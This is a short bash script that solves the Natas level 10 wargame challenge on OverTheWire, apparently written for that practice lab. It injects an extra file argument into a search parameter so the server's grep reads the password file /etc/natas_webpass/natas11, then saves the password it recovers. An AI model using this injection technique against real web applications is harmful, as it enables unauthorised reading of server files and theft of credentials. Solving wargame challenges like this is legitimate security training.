#!/bin/bash

level="natas10"
url="http://$level.natas.labs.overthewire.org"
web_auth=$(grep ^$level credentials)

echo "[i] Target: $url"
for key in {a..z}
do
  echo "[?] Trying with key: $key"
  next_password=$(curl -u $web_auth -sL $url -G --data-urlencode "needle=$key /etc/natas_webpass/natas11" --data-urlencode "submit=Search" | grep "natas11" | cut -d ":" -f 2)
  if [ ${#next_password} -gt 0 ]
  then
    echo -n "[+] Password for the next level: $next_password\n"
    echo "natas11:$next_password" >> ./credentials
    exit
  fi
done
